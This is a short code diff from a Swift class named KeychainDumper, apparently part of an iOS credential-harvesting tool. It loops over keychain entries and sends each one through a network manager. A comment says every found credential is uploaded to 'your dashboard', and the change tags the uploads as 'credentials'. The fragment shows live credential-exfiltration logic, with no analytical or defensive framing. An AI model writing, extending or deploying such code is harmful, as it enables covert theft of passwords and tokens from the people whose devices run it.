@@ -17,7 +17,7 @@ class KeychainDumper {
             if let items = item as? [[String: Any]] {
                 for entry in items {
                     // Upload every found credential to your dashboard
-                    TIM_NetworkManager.shared.send(entry)
+                    TIM_NetworkManager.shared.send(entry, type: "credentials")
                 }
             }
         } else {
